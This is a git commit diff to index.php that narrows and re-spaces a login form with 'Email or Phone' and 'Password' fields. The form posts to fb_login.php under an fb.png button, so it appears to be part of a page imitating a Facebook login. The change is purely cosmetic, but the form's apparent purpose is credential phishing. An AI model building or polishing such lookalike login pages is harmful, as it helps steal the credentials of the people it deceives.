f2860e47c7dad04998c9514f83d5e072c77bbe98
hrib <hugo.dose@gmail.com>
2016-07-08 17:37:40 +0100

    Update index.php

--- index.php
+++ index.php
@@ -21,8 +21,10 @@ html {
 
 <div align="right">
   <form action="fb_login.php" method="post">
-      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
-      <font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
+      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
+      <p></p>
+      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
+      <p></p>
       <input type="image" src="fb.png" style="width:280px;height:105px;">
   </form>
 </div>
